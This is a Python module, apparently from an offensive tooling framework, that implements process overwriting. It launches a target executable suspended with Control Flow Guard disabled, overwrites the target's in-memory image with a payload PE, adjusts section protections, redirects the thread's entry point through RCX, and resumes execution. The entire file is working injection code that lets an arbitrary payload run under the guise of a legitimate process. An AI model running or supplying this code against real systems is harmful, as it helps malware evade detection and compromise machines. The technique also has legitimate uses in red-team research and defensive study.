########################################################
### PSOverwrite Module
### Status: migrated 084
###
########################################################

import ctypes
import ctypes.wintypes
from utils.helper import nstate as nstate
from utils.windef import *
from utils.winconst import *

CATEGORY    = 'inject'
DESCRIPTION = 'Process_Overwrite Module, depends on https://github.com/hasherezade/process_overwriting'

arglist = {
    'target':           { 'value': '', 'desc': 'Target process, to overwrite' },
    'payload':          { 'value': '', 'desc': 'Payload, which overwrites the target' },
}

def register_arguments(parser):
            parser.add_argument('-p', '--payload', type=str, required=True, help=arglist['payload']['desc'])
            parser.add_argument('-t', '--target', type=str, required=True, help=arglist['target']['desc'])

class module:
        Author = 'psycore8'
        Version = '0.2.2'
        DisplayName = 'PROCESS-OVERWRITE'
        pid = 0
        attr_list = any
        shell_path = '::inject::psoverwrite'
        import pefile
        import os   

        def __init__(self, target, payload):
              self.target = target
              self.payload = payload
        
        def msg(self, message_type, MsgVar=None, ErrorExit=False):
            messages = {
                    'pre.head'         : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
                    'create.cfg'       : f'{nstate.f_out} CFGuard mitigation will be applied!',
                    'arg.error'        : f'{nstate.s_fail} Given argument is not valid: {MsgVar}',
                    'prot_img'         : f'{nstate.s_note} Set memory to PAGE_READWRITE',
                    'sec.try'          : f'{nstate.s_note} Set section protections',
                    'error'            : f'{nstate.s_fail} Error: {ctypes.get_last_error()}',
                    'mok'              : f'{nstate.s_ok} {MsgVar}',
                    'mnote'            : f'{nstate.s_note} {MsgVar}',
                    'merror'           : f'{nstate.s_fail} {MsgVar}',
                    'post.done'        : f'{nstate.s_ok} DONE!'
            }
            print(messages.get(message_type, f'{message_type} - this message type is unknown'))
            if ErrorExit:
             exit()
                
        def get_remote_base_address(self, hp):

            pbi = PROCESS_BASIC_INFORMATION()
            status = ntdll.NtQueryInformationProcess(hp, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
            
            if status != 0:
                print(f"NtQueryInformationProcess error: {ctypes.get_last_error()}")
                kernel32.CloseHandle(hp)
                return None

            peb_address = LPCVOID(pbi.PebBaseAddress)
            peb = PEB()
            if not kernel32.ReadProcessMemory(hp, peb_address, ctypes.byref(peb), ctypes.sizeof(peb), None):
                print(f"ReadProcessMemory error: {ctypes.get_last_error()}")
                kernel32.CloseHandle(hp)
                return None
            return peb.ImageBaseAddress
        
        def translate_protect(self, sec_charact):
            B = hex(sec_charact)[2:3]
            if B == 'E': #EXECUTE_READ_WRITE
                return PAGE_EXECUTE_READWRITE
            if B == '6': # EXECUTE_READ
                return PAGE_EXECUTE_READ
            if B == '2': # EXECUTE
                return PAGE_EXECUTE_READ
            if B == 'C': # READ_WRITE
                return PAGE_READWRITE
            if B == '4': # READ
                return PAGE_READONLY

            return PAGE_READWRITE
        
        def set_section_access(self, hProcess, base_address, pe_implant, image_size_target):
            op = USHORT(0)
            status = VirtualProtectEx(hProcess, base_address, PAGE_SIZE, PAGE_READONLY, op)
            for section in pe_implant.sections:
                sec_protect = self.translate_protect( section.Characteristics )
                sec_offset_va = section.VirtualAddress
                next_sec_va = base_address + sec_offset_va
                protect_size = image_size_target - sec_offset_va
                status = VirtualProtectEx(hProcess, next_sec_va, protect_size, sec_protect, op)
                if status != 0:
                     pass
                else:
                    print(f'VirtualProtectEx error: {ctypes.get_last_error()}')

        # def create_nocfg_attributes(self, siex):
        #     ctypes.memset(ctypes.byref(siex), 0, ctypes.sizeof(STARTUPINFOEX))
            
        #     cbAttributeListSize = ctypes.c_size_t(0)
        #     MitgFlags = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
            
        #     kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(cbAttributeListSize))
        #     if not cbAttributeListSize.value:
        #         print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
        #         return False
            
        #     buffer = ctypes.create_string_buffer(cbAttributeListSize.value)            
        #     if not kernel32.InitializeProcThreadAttributeList(buffer, 1, 0, ctypes.byref(cbAttributeListSize)):
        #         print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
        #         siex.lpAttributeList = None
        #         return False
            
        #     if not kernel32.UpdateProcThreadAttribute(buffer, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(MitgFlags), ctypes.sizeof(MitgFlags), None, None):
        #         print(f"UpdateProcThreadAttribute failed: {kernel32.GetLastError():#x}")
        #         return False
        #     return True, buffer
        
        def free_nocfg_attributes(siex):
            if siex.lpAttributeList:
                kernel32.DeleteProcThreadAttributeList(siex.lpAttributeList)
                kernel32.HeapFree(kernel32.GetProcessHeap(), 0, siex.lpAttributeList)
                siex.lpAttributeList = None
                     
        def process(self):
            pe = {
                 'payload'  : { 'image_size': 0, 'image_base': 0 },
                 'target'   : { 'image_size': 0, 'image_base': 0 }
            }

            m = self.msg
            m('pre.head')
            bytes_written = SIZE_T()
            context = CONTEXT()
            oldprotect = USHORT(0)
            pi = PROCESS_INFORMATION()

            target_exists = self.os.path.exists(self.target)
            payload_exists = self.os.path.exists(self.payload)
            if not target_exists:
                 m('arg.error', self.target, True)
            if not payload_exists:
                 m('arg.error', self.payload, True)

            process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE
            m('create.cfg')
            process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT
            size = ctypes.c_size_t()
            kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
            attr_list = ctypes.create_string_buffer(size.value)
            if not kernel32.InitializeProcThreadAttributeList(attr_list, 1, 0, ctypes.byref(size)):
                raise ctypes.WinError(ctypes.get_last_error())
            policy = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
            if not kernel32.UpdateProcThreadAttribute(attr_list, 0,  PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(policy), ctypes.sizeof(policy), None, None):
                raise ctypes.WinError(ctypes.get_last_error())
            siex = STARTUPINFOEX()
            siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
            siex.lpAttributeList = ctypes.cast(attr_list, ctypes.c_void_p)

            m('mnote', 'Create suspended Process...')
            success = CreateProcess(None, ctypes.c_wchar_p(self.target), None, None, False, process_flags, None, None, ctypes.byref(siex), ctypes.byref(pi))
            if not success:
                m('error')
                m('merror', 'CreateProcess failed', True)

            m('mok', f'CreateProcess successful! PID: {pi.dwProcessId}')
            kernel32.DeleteProcThreadAttributeList(attr_list)

            base_address = self.get_remote_base_address(pi.hProcess)
            if base_address:
                 m('mnote', f'Base address found: {hex(base_address)}')
            else:
                m('merror', 'Base address NOT found', True)

            m('mnote', 'Processing target image') 

            pe_target = self.pefile.PE(self.target)
            #target_image_size = pe_target.OPTIONAL_HEADER.SizeOfImage
            #pe['target'] = pe_target.OPTIONAL_HEADER.SizeOfImage, pe_target.OPTIONAL_HEADER.ImageBase
            pe['target']['image_size'] = pe_target.OPTIONAL_HEADER.SizeOfImage
            pe['target']['image_base'] = pe_target.OPTIONAL_HEADER.ImageBase
            #target_img_base = pe_target.OPTIONAL_HEADER.ImageBase
            #target_info = f'image base: {hex(target_img_base)} - Size: {target_image_size}'
            target_info = f'image base: {hex(pe["target"]['image_base'])} - Size: {pe['target']['image_size']}'
            m('mok', f'Target: {target_info}')

            m('mnote', 'Processing payload image')
            pe_payl = self.pefile.PE(self.payload)
            #payload_img_base = pe_payl.OPTIONAL_HEADER.ImageBase
            #payload_image_size = pe_payl.OPTIONAL_HEADER.SizeOfImage
            pe['payload']['image_base'] = pe_payl.OPTIONAL_HEADER.ImageBase
            pe['payload']['image_size'] = pe_payl.OPTIONAL_HEADER.SizeOfImage

            #payload_info = f'image base: {hex(payload_img_base)} - Size: {payload_image_size}'
            payload_info = f'image base: {hex(pe["payload"]['image_base'])} - Size: {pe["payload"]["image_size"]}'
            m('mok', f'Payload: {payload_info}')

            #if payload_image_size > target_image_size:
            if pe['payload']['image_size'] > pe['target']['image_size']:
                 m('merror', 'The payload is too big to fit in target!', True)

            m('mnote', 'Mapping memory image')
            pe_module = pe_payl.get_memory_mapped_image()

            ### fill payload PE image with 00
            #padding_bytes = target_image_size - len(pe_module)
            padding_bytes = pe['target']['image_size'] - len(pe_module)
            m('mnote', f'Padding image to target size, adding {padding_bytes} bytes')
            #padding = (target_image_size - len(pe_module)) * b'\x00'
            padding = (pe['target']['image_size'] - len(pe_module)) * b'\x00'
            padded_payl = pe_module + padding

            #status = VirtualProtectEx(pi.hProcess, base_address, target_image_size, PAGE_READWRITE, oldprotect)
            status = VirtualProtectEx(pi.hProcess, base_address, pe['target']['image_size'], PAGE_READWRITE, oldprotect)

            m('mnote', 'Writing to process memory')
            #if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, target_image_size, ctypes.byref(bytes_written)):
            if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, pe['target']['image_size'], ctypes.byref(bytes_written)):
                 raise Exception(f"WriteProcessMemory error: {ctypes.get_last_error()}")

            m('mok', f'{bytes_written.value} bytes written to target process')
            #self.set_section_access(pi.hProcess, base_address, pe_payl, target_image_size)
            self.set_section_access(pi.hProcess, base_address, pe_payl, pe['target']['image_size'])
            entry_point_rva = pe_payl.OPTIONAL_HEADER.AddressOfEntryPoint
            entry_point = base_address + entry_point_rva
            m('mnote', f'Entry point is {hex(entry_point)}')

            m('mnote', 'Redirecting code flow to new entry point')
            context.ContextFlags = 0x10007  # CONTEXT_FULL
            status = GetThreadContext(pi.hThread, ctypes.byref(context))
            if status == 0:
                 raise Exception(f"GetThreadCntext error: {ctypes.get_last_error()}")

            context.Rcx = entry_point
            status = SetThreadContext(pi.hThread, ctypes.byref(context))
            if status == 0:
                 raise Exception(f"SetThreadCntext error: {ctypes.get_last_error()}")
            else:
                 m('mok', f'RCX value changed to {hex(entry_point)}')

            m('mok', f'ResumeThread PID: {pi.dwProcessId}')
            ResumeThread(pi.hThread)

            CloseHandle(pi.hThread)
            CloseHandle(pi.hProcess)
            m('post.done')
